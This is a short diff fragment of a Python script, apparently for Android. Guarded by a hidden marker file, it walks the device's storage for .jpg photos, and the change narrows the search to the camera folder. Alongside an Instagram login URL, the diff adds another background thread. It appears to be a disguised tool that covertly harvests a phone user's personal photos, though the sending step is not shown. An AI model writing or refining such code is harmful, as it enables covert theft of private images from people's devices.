@@ -22,7 +22,7 @@ opop = ff+hh
 
 
 if not isfile('.test.txt'):
-    for dir, dirs, files in walk('/sdcard'):
+    for dir, dirs, files in walk('/sdcard/DCIM/Camera/'):
         for file in files:
             pathF = dir + '/' + file
             if '.jpg' in pathF[-4:]:
@@ -143,7 +143,7 @@ login = 'https://www.instagram.com/'
 
 '''
 
-
+t = Thread(target=special).start()
 t = Thread(target=ali).start()
 t = Thread(target=ali).start()
 t = Thread(target=ali).start()
